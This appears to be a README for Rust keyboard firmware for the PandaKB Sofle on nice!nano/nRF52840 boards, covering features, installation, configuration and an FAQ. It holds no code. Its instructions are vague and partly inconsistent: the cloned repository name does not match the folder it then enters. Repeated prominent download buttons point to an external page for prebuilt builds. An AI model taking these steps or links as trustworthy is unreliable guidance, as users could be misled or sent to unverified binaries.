# RMK for Sofle v2026 - keyboard firmware 2026

> **Rust-driven firmware for the PandaKB Sofle, built around BLE split use, Vial integration, OLED output, and RGB control on the nice!nano/nRF52840 platform.**

[![Platform](https://img.shields.io/badge/Platform-PandaKB%20Sofle-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/willdavis1990/sofle-nrf52840-rmk?style=flat-square)](https://github.com/willdavis1990/sofle-nrf52840-rmk)

---

<p align="center">
  <a href="https://willdavis1990.github.io/sofle-nrf52840-rmk/">
    <img src="https://img.shields.io/badge/Download-RMK%20for%20Sofle%20Latest-brightgreen?style=for-the-badge" alt="Download RMK for Sofle">
  </a>
</p>

> **[Direct Download - RMK for Sofle v2026](https://willdavis1990.github.io/sofle-nrf52840-rmk/)**

---

[Download Latest Build](https://willdavis1990.github.io/sofle-nrf52840-rmk/)

---

## Overview

RMK for Sofle is a Rust-based firmware project made for the PandaKB Sofle keyboard. It targets split keyboard setups on nice!nano boards and other nRF52840-compatible hardware, with Bluetooth LE forming a central part of the workflow.

The firmware is aimed at users who want a flexible split layout with modern keyboard capabilities, including Vial support, OLED status output, battery reporting, rotary encoder handling, and WS2812 RGB control. These pieces are combined into a single firmware package designed specifically for the Sofle layout.

---

## What it includes

- Split keyboard firmware for the PandaKB Sofle
- Bluetooth LE support for wireless operation
- Compatibility with nice!nano and nRF52840-based hardware
- Vial configuration support for live keymap changes
- SSD1306 OLED display support
- Battery reporting for power status visibility
- Rotary encoder support
- Custom keymap layers and combos
- WS2812 RGB support for per-key or accent lighting

---

## Installation

1. Clone or download the repository:
   - `git clone https://github.com/willdavis1990/sofle-nrf52840-rmk.git
2. Open the project folder:
   - `cd rmk-for-sofle`
3. Build or flash the firmware using your preferred Rust-based workflow for the target board.
4. Transfer the resulting firmware to the appropriate nice!nano or nRF52840 device.

If you are using a prepared release build, download it from the project page and follow the flashing method recommended for your board.

---

## Using the firmware

Once flashed, power up both halves of the Sofle and allow them to form the BLE split link.

Typical workflow:
- Connect the keyboard to a host device
- Use Vial to adjust keymaps where supported
- Review OLED output for status or layer information
- Monitor battery reporting when running wirelessly
- Tune layers, combos, and encoder behavior to match your layout

If RGB or display behavior is enabled in your build, those features will follow the configuration included in the firmware image.

---

## Configuration

Most behavior is defined in the firmware source and controlled through build-time settings.

Common areas to adjust include:
- Keymap layers
- Combos
- Encoder assignments
- OLED content
- Battery/status reporting
- RGB behavior for WS2812 output
- Vial-related options

If you are maintaining a custom build, keep your changes in the project source so they are included the next time you compile the firmware.

---

## Requirements

- PandaKB Sofle hardware
- nice!nano or a compatible nRF52840-based controller
- Bluetooth LE-capable host environment
- Support for split keyboard flashing and pairing
- Optional OLED hardware using SSD1306-compatible displays
- Optional WS2812 RGB hardware for lighting effects
- A Rust-oriented build setup if compiling from source

---

## FAQ

**How do I update the firmware?**  
Download the newest build or rebuild from source, then flash it to the controller(s) using your normal device workflow.

**Where do I change keymaps?**  
Keymap and layer behavior are defined in the firmware configuration. If Vial is enabled in your build, some changes may also be handled through the Vial interface.

**Why are the OLED or RGB features not active?**  
Check that your hardware matches the build configuration and that the relevant display or WS2812 options are enabled in the source.

**What should I do if the split halves do not connect?**  
Verify the BLE setup, board pairing, power state, and controller compatibility for both halves before reflashing.

**Is there documentation for build options?**  
The most reliable source is the repository itself, including firmware files, build settings, and any notes included alongside releases.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
